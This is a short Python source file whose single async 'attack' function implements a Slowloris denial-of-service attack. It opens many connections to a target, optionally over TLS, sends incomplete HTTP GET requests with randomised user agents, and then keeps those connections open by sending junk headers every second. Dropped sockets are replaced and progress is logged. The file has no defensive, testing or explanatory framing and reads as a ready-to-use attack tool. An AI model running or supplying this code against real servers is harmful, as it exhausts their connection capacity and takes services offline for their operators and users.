import asyncio
import socket
import ssl
import time
import random
from datetime import datetime
from fake_useragent import UserAgent

ua = UserAgent()

async def attack(target, duration, max_rate, port=80, proxies=None, logger=None, output_format="text"):
    end_time = time.time() + duration
    sockets = []
    request_count = 0
    last_log_time = time.time()

    def build_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            if port == 443:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=target)
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {target}\r\n".encode("utf-8"))
            s.send(f"User-Agent: {ua.random}\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            return s
        except Exception as e:
            if logger:
                logger.warning(f"[{datetime.now().strftime('%H:%M:%S')}] Socket build failed: {e}")
            return None

    # Prime sockets
    for _ in range(max_rate):
        s = build_socket()
        if s:
            sockets.append(s)

    while time.time() < end_time:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                request_count += 1
            except Exception:
                sockets.remove(s)
                s.close()
        
        while len(sockets) < max_rate:
            s = build_socket()
            if s:
                sockets.append(s)

        now = time.time()
        if now - last_log_time > 5:
            msg = f"[{datetime.now().strftime('%H:%M:%S')}] Slowloris: Active sockets: {len(sockets)}, Sent headers: {request_count}"
            if logger:
                logger.info(msg)
            else:
                print(msg)
            last_log_time = now

        await asyncio.sleep(1)

   
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass